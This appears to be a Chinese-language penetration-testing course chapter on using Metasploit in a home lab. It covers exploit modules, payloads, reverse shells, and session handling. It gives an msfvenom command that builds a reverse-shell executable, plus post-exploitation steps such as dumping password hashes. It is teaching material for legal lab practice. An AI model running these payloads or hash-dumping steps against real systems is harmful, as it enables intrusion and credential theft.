@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>模块七第 12 章：Metasploit 深入 · 网络安全手记</title>
+<link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<div class="wrap">
+  <header class="site">
+    <div class="name"><a href="../index.html">网络安全手记</a></div>
+    <div class="desc">记录一个初学者成为网络安全工程师的日常。</div>
+    <nav>
+      <a href="../index.html">首页</a>
+      <a href="../course.html">课程</a>
+      <a href="../about.html">关于</a>
+    </nav>
+  </header>
+
+  <main>
+    <article>
+      <h1>模块七第 12 章：Metasploit 深入</h1>
+      <div class="meta"><span class="tag">Web 安全与渗透测试</span>2026-11-25 · 模块七</div>
+      <p>上一章我们把 Metasploit 定位成“漏洞利用的军火库 + 发射器”。这一章讲它本身怎么用。Metasploit Framework（常简称 MSF）是开源的渗透测试框架，装在 Kali Linux 里开箱即用。它的核心思想是把“利用漏洞”这件事拆成标准零件：漏洞利用模块、载荷、编码器、辅助模块，拼起来就能打。学会拼零件，你就不用每次都从零写利用代码——但也要明白，零件拼出来的东西，你得知道它在干什么，否则打中了都不知道为什么。</p>
+      <p>先立规矩：本章所有操作只针对你自己的虚拟机靶场（比如 Metasploitable）。Metasploit 的利用模块是真的攻击代码，对真实系统用就是越界行为。开始之前，先给靶机拍个快照。</p>
+
+      <h2>四个核心概念：模块、载荷、目标、会话</h2>
+      <p><strong>模块（Module）</strong>是 Metasploit 的零件，分六类，最常用的是三类：<strong>Exploit（利用模块）</strong>——针对某个具体漏洞的攻击代码，比如 <code>exploit/windows/smb/ms17_010_eternalblue</code>（永恒之蓝）；<strong>Auxiliary（辅助模块）</strong>——不直接拿权限的扫描、探测、枚举，比如扫 SMB 版本、枚举用户；<strong>Payload（载荷）</strong>——利用成功后在目标上运行的代码，比如反弹一个 shell 回来。剩下的三类是 Encoder（编码器，躲检测）、NOP（填充）、Post（后渗透模块，利用成功之后用的）。</p>
+      <p><strong>载荷</strong>要分清两个家族。普通 shell 载荷（比如 <code>windows/meterpreter/reverse_tcp</code>）利用成功后给你一个 Meterpreter 会话——这是 Metasploit 自带的高级 shell，能传文件、截图、抓密码、提权。按连接方向分：<strong>正向（bind）</strong>是目标监听一个端口、你连过去；<strong>反向（reverse）</strong>是目标主动连回你的监听端口——反向更常用，因为目标的防火墙通常拦入站、不拦出站。初学者记住：打之前要先在自己这边开好监听（<code>use exploit/multi/handler</code>），不然 shell 回来了没人接。</p>
+      <p><strong>目标（Target）</strong>和<strong>会话（Session）</strong>是另外两个概念：很多利用模块要选目标类型（比如目标系统的版本），选错了就打不中；利用成功后，MSF 会建立一个会话（Session），用 <code>sessions -l</code> 列出所有会话，<code>sessions -i 1</code> 进入 1 号会话。会话就是你和目标之间的“电话线”，断了就得重新打。</p>
+
+      <h2>一次完整的利用：六步流程</h2>
+      <p>在 msfconsole 里，一次标准利用走六步。第一步，<code>search 关键词</code>找模块（比如 <code>search ms17_010</code>）。第二步，<code>use 模块路径</code>选中它。第三步，<code>show options</code>看要填哪些参数。第四步，<code>set RHOSTS 靶机IP</code>、<code>set LHOST 你的IP</code>、<code>set LPORT 4444</code>，把必需参数填好——RHOSTS 是目标，LHOST 是等 shell 回连的你自己，这两个最容易填反。第五步，<code>set payload 载荷名</code>选载荷。第六步，<code>exploit</code>（或 <code>run</code>）开打。打中了，屏幕上出现 Meterpreter 提示符；打不中，看报错信息：是目标没漏洞、参数填错了、还是网络不通——报错信息要一句一句读，别上来就换模块。</p>
+      <p>打中之后别急着“玩”，先做三件事：<code>getuid</code> 看当前是谁、<code>sysinfo</code> 看目标系统信息、<code>pwd</code> 和 <code>ls</code> 看当前目录——这三条就是利用成功的“证据三件套”，写报告时要用。后渗透模块（Post）这时才派上用场：<code>post/windows/gather/hashdump</code> 抓密码哈希、<code>post/multi/recon/local_exploit_suggester</code> 推荐本机提权漏洞（第 13、14 章的提权就是从这里接上的）。</p>
+
+      <h2>msfvenom：自己生成载荷</h2>
+      <p>有时候目标上没有现成的漏洞可打，需要让目标运行一个你给的文件——这就是 <code>msfvenom</code> 的活：它按你选的载荷生成一个可执行文件（比如一个 exe、一个 apk），目标一运行，shell 就反弹回你的监听器。生成命令像这样：<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的IP LPORT=4444 -f exe -o shell.exe</code>。注意两点：第一，生成的文件会被杀毒软件报毒，在自己的虚拟机里要先关掉靶机的杀毒软件再实验；第二，<strong>绝不能把生成的文件发给真人、放到真实环境里</strong>——那就是投放恶意软件，只在自己的靶场里生成、只在自己的靶机上运行。</p>
+
+      <figure class="diagram">
+        <svg viewBox="0 0 560 340" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Metasploit利用六步流程图：搜索模块、选中、看参数、填地址、选载荷、开打">
+          <rect x="20" y="20" width="520" height="40" rx="8" fill="#eff6ff" stroke="#1a1a2e" stroke-width="1.5"/>
+          <text x="280" y="45" text-anchor="middle" font-size="13" fill="#1a1a2e">msfconsole 六步：search → use → show options → set → set payload → exploit</text>
+          <rect x="20" y="90" width="160" height="56" rx="8" fill="#fef3c7" stroke="#1a1a2e" stroke-width="1.5"/>
+          <text x="100" y="114" text-anchor="middle" font-size="13" fill="#1a1a2e">Exploit 利用模块</text>
+          <text x="100" y="134" text-anchor="middle" font-size="11" fill="#666">针对某个具体漏洞</text>
+          <rect x="200" y="90" width="160" height="56" rx="8" fill="#fef3c7" stroke="#1a1a2e" stroke-width="1.5"/>
+          <text x="280" y="114" text-anchor="middle" font-size="13" fill="#1a1a2e">Payload 载荷</text>
+          <text x="280" y="134" text-anchor="middle" font-size="11" fill="#666">打中后运行的代码</text>
+          <rect x="380" y="90" width="160" height="56" rx="8" fill="#fef3c7" stroke="#1a1a2e" stroke-width="1.5"/>
+          <text x="460" y="114" text-anchor="middle" font-size="13" fill="#1a1a2e">Auxiliary 辅助模块</text>
+          <text x="460" y="134" text-anchor="middle" font-size="11" fill="#666">扫描、探测、枚举</text>
+          <rect x="20" y="180" width="250" height="56" rx="8" fill="#dcfce7" stroke="#1a1a2e" stroke-width="1.5"/>
+          <text x="145" y="204" text-anchor="middle" font-size="13" fill="#1a1a2e">反向 shell：目标连回你</text>
+          <text x="145" y="224" text-anchor="middle" font-size="11" fill="#666">先开监听，再开打</text>
+          <rect x="290" y="180" width="250" height="56" rx="8" fill="#dcfce7" stroke="#1a1a2e" stroke-width="1.5"/>
+          <text x="415" y="204" text-anchor="middle" font-size="13" fill="#1a1a2e">Meterpreter 会话</text>
+          <text x="415" y="224" text-anchor="middle" font-size="11" fill="#666">传文件、截图、抓密码、提权</text>
+          <text x="280" y="272" text-anchor="middle" font-size="12" fill="#666">打中后先做证据三件套：getuid / sysinfo / pwd + ls</text>
+          <text x="280" y="296" text-anchor="middle" font-size="12" fill="#666">RHOSTS 是目标，LHOST 是你自己——两个最容易填反</text>
+          <text x="280" y="320" text-anchor="middle" font-size="12" fill="#666">msfvenom 生成的载荷只在自己的靶机上运行</text>
+        </svg>
+        <figcaption>图：Metasploit 的模块分工与六步利用流程——先开监听，再开打</figcaption>
+      </figure>
+
+      <div class="teacher-note"><strong>老师经验：</strong>Metasploit 新手最常见的翻车，不是模块选错了，而是 RHOSTS 和 LHOST 填反了——目标地址填成自己的 IP，或者监听地址填成目标的 IP，然后对着“连接超时”发呆半小时。我的检查习惯是：开打之前，把 <code>show options</code> 的输出念一遍，RHOSTS 是不是靶机、LHOST 是不是 Kali 的 IP、LPORT 有没有被占用，三个确认完再按回车。另一个教训：打中了别急着乱翻目标的文件系统，先做证据三件套、再看提权建议——Meterpreter 里 <code>background</code> 可以把会话挂起、回去继续查资料，会话不会丢。最后提醒一句：Metasploit 的模块库更新很快，Kali 里定期 <code>msfupdate</code> 一下，但别在测试中途更新——版本一变，之前验证过的模块行为可能跟着变。</div>
+
+      <h2>动手做</h2>
+      <p>1. 只在自己的虚拟机里：打开 Kali 的 msfconsole，跑 <code>search ms17_010</code>，看返回了哪些模块，读一读其中一个模块的描述（<code>info 模块路径</code>），写下它针对的是哪个漏洞、影响哪些系统。<br>2. 对靶机做一次完整利用：给靶机拍快照，先用 Nmap 确认靶机开了存在漏洞的服务，再按六步流程选模块、填参数、选载荷、开打；打中后做证据三件套（getuid、sysinfo、pwd + ls）并记录下来。<br>3. 练会话管理：打中后用 <code>background</code> 把会话挂起，用 <code>sessions -l</code> 查看，再用 <code>sessions -i 编号</code> 回到会话；然后跑 <code>post/multi/recon/local_exploit_suggester</code>，记下它推荐的提权漏洞。<br>4. msfvenom 实验：在 Kali 里生成一个反弹 shell 的测试文件（只生成、不外发），在自己的靶机上运行它，确认监听器收到会话；实验结束删掉生成的文件，并把靶机恢复到快照。</p>
+      <h2>避坑</h2>
+      <p>只对自己的虚拟机靶场用 Metasploit：对真实系统用利用模块是越界行为；开打前念一遍参数：RHOSTS 是目标、LHOST 是你自己，填反了最常见；先开监听再开打：反向 shell 回来了没人接，等于白打；打中先做证据三件套：getuid、sysinfo、pwd + ls，写报告要用；msfvenom 生成的文件绝不外发：只在自己的靶机上运行，实验结束删掉并恢复快照；别在测试中途更新框架：版本变了，验证过的模块行为可能跟着变。</p>
+      <p>Metasploit 讲完了，利用环节最重的工具已经在你手里。下一章我们接上利用成功之后的问题：<a href="m7c13-linux-privesc.html">第 13 章：Linux 提权</a>——拿到一个普通用户的 shell 之后，怎么变成 root。</p>
+      <div class="summary-box"><strong>本课小结</strong>
+        <ul>
+          <li>Metasploit 把利用拆成标准零件：Exploit 利用模块、Payload 载荷、Auxiliary 辅助模块、Encoder、Post 后渗透模块。</li>
+          <li>六步流程：search → use → show options → set → set payload → exploit；RHOSTS 是目标，LHOST 是你自己。</li>
+          <li>反向 shell 更常用（目标主动连回监听器），开打前要先开好监听；Meterpreter 是高级 shell，能传文件、截图、抓密码、提权。</li>
+          <li>打中后先做证据三件套（getuid、sysinfo、pwd + ls），再用 Post 模块找提权机会。</li>
+          <li>msfvenom 生成的载荷只在自己的靶机上运行，绝不外发；利用前先给靶机拍快照。</li>
+        </ul>
+      </div>
+      <div class="lesson-nav">
+        <a href="m7c11-exploit-tooling.html">← 上一章：第 11 章：漏洞利用工具链</a>
+        <a href="../course.html">课程目录</a>
+        <a href="m7c13-linux-privesc.html">下一章：第 13 章：Linux 提权 →</a>
+      </div>
+    </article>
+  </main>
+
+  <footer class="site">网络安全手记 · 2026</footer>
+</div>
+</body>
+</html>
